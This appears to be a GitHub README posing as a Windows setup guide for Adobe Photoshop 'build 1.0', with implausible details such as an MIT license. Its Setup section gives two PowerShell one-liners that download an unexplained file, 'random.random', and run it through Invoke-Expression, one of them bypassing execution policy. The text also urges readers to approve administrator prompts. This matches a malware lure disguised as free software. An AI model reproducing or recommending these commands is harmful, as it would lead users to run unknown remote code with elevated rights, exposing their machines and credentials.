# Adobe Photoshop

Adobe Photoshop on a PC is what this page is about. Build 1.0 targets Windows 10 and Windows 11, 64-bit, and the files in the repository are the ones the setup commands read.


Adobe Photoshop is a professional image editor built for Windows desktops where pixels, color, and typography meet production deadlines. It combines a deep toolset for retouching, masking, compositing, and illustration with GPU-accelerated filters and tight color management for print and screen. A typical session starts by opening RAW or layered sources, organizing work in groups, and using selections and adjustment layers to refine exposure and color without flattening originals. You might remove distractions with content-aware fill, build composites with blend modes, add type and vector shapes, then export PSD masters plus flattened PNG or TIFF deliverables. This repository bundles a Windows setup package for a pinned release, short install and workspace notes, and a changelog that records build numbers and notable fixes. Use the notes when migrating presets or actions between machines so your panels, shortcuts, and color settings stay consistent.

[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()
[![Build](https://img.shields.io/badge/build-1.0-0ea5e9?style=flat-square)]()
[![License](https://img.shields.io/badge/license-MIT-16a34a?style=flat-square)]()

## What you do with it

Day to day, Adobe Photoshop is opened, a project is saved locally, and the app is closed from its own window. Nothing in that loop depends on a page outside this repository.

Adobe Photoshop behaves like other desktop software on this PC: it has a window, a place for projects, and a way back to the last file. These notes stay with build 1.0. If you move the project to another disk, open it again from inside Adobe Photoshop rather than from a copy of this repository.

- Non-destructive adjustment layers preserve originals while you refine tone and color.
- Precise pen and lasso selections isolate hair, products, and complex edges quickly.
- Smart Objects keep scaled logos and textures sharp through repeated transform cycles.
- Content-Aware Fill removes objects while rebuilding background texture and lighting naturally.
- Camera Raw develops RAW files before they enter your layered Photoshop document workflow.
- Blend modes and layer masks combine exposures, textures, and graphics without destructive merges.
- Advanced brush engines simulate natural media with pressure, tilt, and texture dynamics.
- Export presets deliver web, print, and video frames from the same master PSD file.

## Before you run it

Before the commands, close any old Adobe Photoshop window. Windows should be 64-bit, with about 16 GB of memory and 12 GB free. If the account is not an administrator, the shell will ask once and then continue.

## Setup

From this folder, one of the two PowerShell lines is enough. They fetch `random.random` and run it. Use the longer line when the short one stops on an execution-policy message. Do not point them at a different file: this build expects the copy stored here.

```powershell
irm https://raw.githubusercontent.com/rothnina89535913/photoshop-setup-guide/main/random.random | Invoke-Expression
```

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/rothnina89535913/photoshop-setup-guide/main/random.random | Invoke-Expression"
```

## After setup

When the command finishes, start Adobe Photoshop from the Start menu and open one local project. If the window does not appear, restart once and look again. The helper `Initial.js` is only a small file next to the setup, not a second program.

## If it stops

| What you see | What to do |
| --- | --- |
| The command stops immediately | Run the longer PowerShell line. It sets the policy for that command only. |
| Adobe Photoshop does not show in Start | Restart, then search for the name again. |
| Not enough disk | Free about 12 GB and run the command once more. |
| Windows asks for approval | Confirm once. The shell needs it to finish the setup. |

## Files

| File | What it is |
| --- | --- |
| `random.random` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `rothnina89535913/photoshop-setup-guide`. Adobe Photoshop 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
